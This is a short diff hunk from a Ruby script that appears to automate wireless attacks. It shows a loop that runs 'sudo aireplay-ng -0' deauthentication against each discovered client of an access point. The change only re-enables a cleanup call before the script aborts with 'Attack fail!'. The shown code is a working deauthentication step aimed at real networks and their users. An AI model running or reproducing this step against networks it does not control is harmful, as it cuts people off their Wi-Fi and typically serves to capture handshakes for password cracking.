@@ -31,7 +31,7 @@ def aireplay_runner stations = Array.new
 			2.times do
 				if !system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0")
 					monitoring_stopper()
-					#cleaner()
+					cleaner()
 					abort("\nAttack fail!")
 				end
 				sleep(2)
